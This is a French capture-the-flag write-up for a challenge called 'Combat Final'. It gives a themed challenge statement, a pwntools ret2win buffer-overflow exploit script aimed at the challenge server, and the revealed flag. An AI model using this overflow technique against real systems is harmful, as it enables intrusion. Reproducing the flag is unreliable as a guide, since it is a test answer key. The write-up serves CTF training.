## Enoncé

>Les anciens guerriers de Naori croyaient que pour accéder à la connaissance ultime, il fallait vaincre non seulement ses ennemis, mais aussi ses propres faiblesses. Le Combat Final est une épreuve mythique où chaque guerrier doit prouver sa force, son intelligence, et sa maîtrise des arts guerriers. Ce n'est qu'en triomphant de cette épreuve que vous pourrez enfin atteindre le sommet du sanctuaire et révéler le dernier secret.
>
>Vous voilà face à l'ultime épreuve. Vous vous trouvez dans une arène souterraine, éclairée uniquement par des torches vacillantes. Au centre de l'arène se dresse une statue imposante d'un ancien guerrier, l'arme au poing. Une inscription à ses pieds indique :
>
>"Ceux qui osent défier l'esprit du combat doivent être prêts à tout risquer. Le moindre faux mouvement peut vous conduire à la défaite. Préparez-vous, car le combat sera rude."
>
>Pour sortir victorieux de cette épreuve, vous devrez exploiter les faiblesses de l'adversaire. Cette fois, il s'agit de trouver une vulnérabilité cachée dans le code du sanctuaire, représentée par le programme que vous devez maîtriser.
>
>En triomphant de cette épreuve, vous serez reconnu comme un véritable maître du Chemin du Guerrier. Les esprits de Naori vous accorderont leur ultime bénédiction, et vous aurez enfin accès aux secrets cachés depuis des siècles.
>
>Jeune guerrier, ce combat est le plus difficile que vous aurez à affronter, mais c'est aussi le dernier obstacle entre vous et la gloire. Faites preuve de courage, de ruse, et de précision. Que la force des anciens guerriers de Naori soit avec vous dans ce Combat Final.


![combats](../../../../attachements/combats)
## Résolution


```python
#!/usr/bin/env python3

from pwn import *

#context(arch="amd64", os="linux", endian="little", word_size=64)
exe = context.binary = ELF(args.EXE or 'combats')

p = remote("challenges.hackagou.nc", 5003)

guerrier_addr = 0x4011d8
ret_addr = 0x40101a

payload = b'A' * 136
payload += p64(ret_addr)
payload += p64(guerrier_addr)

p.readuntil(b'> ')
p.sendline(payload)
p.interactive()
```

>[!question]- Spoiler du flag
> OPENNC{L3_GU3RR13r_c0mb47_4v3C_H0nN3uR.}

